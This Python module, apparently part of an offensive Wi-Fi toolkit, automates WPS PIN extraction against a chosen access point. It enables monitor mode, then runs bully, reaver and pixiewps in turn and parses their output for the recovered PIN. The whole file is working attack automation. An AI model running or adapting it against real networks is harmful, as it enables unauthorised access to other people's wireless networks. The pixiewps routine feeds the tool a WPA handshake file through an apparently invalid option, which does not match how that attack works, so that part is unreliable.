#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import time
import re
import os
from utils.hardware import interface, hardware_available, adapter_detected
from utils.interface import enable_monitor_mode, set_channel
from utils.status import print_status, ProgressDisplay, confirm_action
from utils.process import active_processes, add_process, remove_process, is_cancelled, set_cancel_flag
from utils.logger import log_capture


def wps_attack(bssid: str, channel: str = "1", method: str = "auto") -> str:
    """
    WPS PIN extraction.
    method: 'auto', 'bully', 'reaver', 'pixiewps'
    """
    if not hardware_available or not adapter_detected:
        print_status("No USB adapter detected", "error")
        return None

    set_cancel_flag(False)
    print_status(f"WPS attack: {bssid} (method={method})", "info")
    print_status("This may take several minutes. Press Ctrl+C to cancel.", "warning")

    mon_iface = enable_monitor_mode(interface)
    if not mon_iface:
        print_status("Monitor mode failed", "error")
        return None

    if not set_channel(channel):
        return None

    output_file = f"/tmp/wps_{os.environ.get('SESSION_ID', 'unknown')}.txt"

    # If auto, try methods in order: bully, reaver, pixiewps
    if method == "auto":
        methods = ["bully", "reaver", "pixiewps"]
    else:
        methods = [method]

    result = None
    for m in methods:
        if is_cancelled():
            break
        if m == "bully":
            result = _wps_bully(mon_iface, bssid, output_file)
        elif m == "reaver":
            result = _wps_reaver(mon_iface, bssid, output_file)
        elif m == "pixiewps":
            result = _wps_pixiewps(mon_iface, bssid, channel, output_file)
        if result:
            break

    if result:
        print_status(f"WPS PIN: {result}", "success")
        log_capture("wps_pin", bssid, "", output_file)
        return result
    else:
        print_status("WPS attack failed", "error")
        return None


def _wps_bully(iface: str, bssid: str, outfile: str) -> str:
    """Use bully to get PIN."""
    try:
        print_status("Attempting bully attack...", "info")
        cmd = ["bully", iface, "-b", bssid, "-B", "-v", "1", "-o", outfile]
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        add_process(proc)

        progress = ProgressDisplay()
        progress.start("Bully WPS attack", 90)

        for i in range(90):
            if is_cancelled():
                progress.stop()
                proc.terminate()
                remove_process(proc)
                return None
            time.sleep(1)
            progress.update(i + 1)
            if os.path.exists(outfile) and os.path.getsize(outfile) > 0:
                with open(outfile, 'r') as f:
                    content = f.read()
                    pin_match = re.search(r'PIN:\s*(\d{8})', content)
                    if pin_match:
                        progress.stop()
                        proc.terminate()
                        remove_process(proc)
                        return pin_match.group(1)
        proc.terminate()
        remove_process(proc)
    except Exception as e:
        print_status(f"Bully failed: {e}", "warning")
    return None


def _wps_reaver(iface: str, bssid: str, outfile: str) -> str:
    """Use reaver to get PIN."""
    try:
        print_status("Attempting reaver attack...", "info")
        cmd = ["reaver", "-i", iface, "-b", bssid, "-vv", "-o", outfile]
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        add_process(proc)

        progress = ProgressDisplay()
        progress.start("Reaver WPS attack", 120)

        for i in range(120):
            if is_cancelled():
                progress.stop()
                proc.terminate()
                remove_process(proc)
                return None
            time.sleep(1)
            progress.update(i + 1)
            if os.path.exists(outfile) and os.path.getsize(outfile) > 0:
                with open(outfile, 'r') as f:
                    content = f.read()
                    pin_match = re.search(r'PIN:\s*(\d{8})', content)
                    if pin_match:
                        progress.stop()
                        proc.terminate()
                        remove_process(proc)
                        return pin_match.group(1)
        proc.terminate()
        remove_process(proc)
    except Exception as e:
        print_status(f"Reaver failed: {e}", "warning")
    return None


def _wps_pixiewps(iface: str, bssid: str, channel: str, outfile: str) -> str:
    """Use pixiewps offline attack – requires handshake capture first."""
    print_status("Attempting pixiewps offline attack (requires handshake capture)...", "info")
    # Capture handshake first
    from core.handshake import capture_handshake
    handshake_file = capture_handshake(bssid, channel=channel)
    if not handshake_file:
        return None
    try:
        cmd = ["pixiewps", "--handshake", handshake_file, "--force"]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if proc.returncode == 0:
            pin_match = re.search(r'PIN:\s*(\d{8})', proc.stdout)
            if pin_match:
                return pin_match.group(1)
    except Exception as e:
        print_status(f"Pixiewps failed: {e}", "warning")
    return None
